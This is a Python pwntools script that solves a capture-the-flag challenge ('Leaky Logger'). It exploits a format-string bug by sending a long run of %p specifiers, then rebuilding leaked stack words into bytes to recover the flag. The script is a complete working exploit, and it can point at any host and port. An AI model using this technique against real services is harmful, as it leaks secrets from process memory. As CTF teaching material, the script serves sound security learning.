#!/usr/bin/env python3
"""
Leaky Logger solver.

printf(line) treats our input as a format string. We feed a run of %p, which
walks the stack and dumps pointer-sized words. The flag, read into a stack
buffer at startup, sits a little way up the stack (past our own input buffer),
so a wide enough scan leaks it. We pack each leaked word little-endian, keep
them in stack order, concatenate, and pull rstcon{...} back out of the bytes.

    python3 solve.py            # local ./logger
    python3 solve.py HOST PORT  # remote service
"""
import sys, re
from pwn import *

context.log_level = "error"

NWORDS = 90  # reach past the 512-byte input buffer to the flag's stack slot
SEP = b"|"


def leak(io) -> bytes:
    io.recvuntil(b"recorded:")
    io.sendline(SEP.join(b"%p" for _ in range(NWORDS)))
    data = io.recvall(timeout=3)

    # parse pointer words in stack order; (nil) is a null word, keep alignment
    toks = re.findall(rb"0x[0-9a-f]+|\(nil\)", data)
    blob = b""
    for t in toks:
        v = 0 if t == b"(nil)" else int(t, 16)
        if v < (1 << 64):
            blob += v.to_bytes(8, "little")
    return blob


def main():
    if len(sys.argv) >= 3:
        io = remote(sys.argv[1], int(sys.argv[2]))
    else:
        io = process("./logger")

    blob = leak(io)
    io.close()

    m = re.search(rb"rstcon\{[ -~]*?\}", blob)
    if not m:
        print("flag not found in leak; raise NWORDS")
        sys.exit(1)
    print(m.group().decode())


if __name__ == "__main__":
    main()
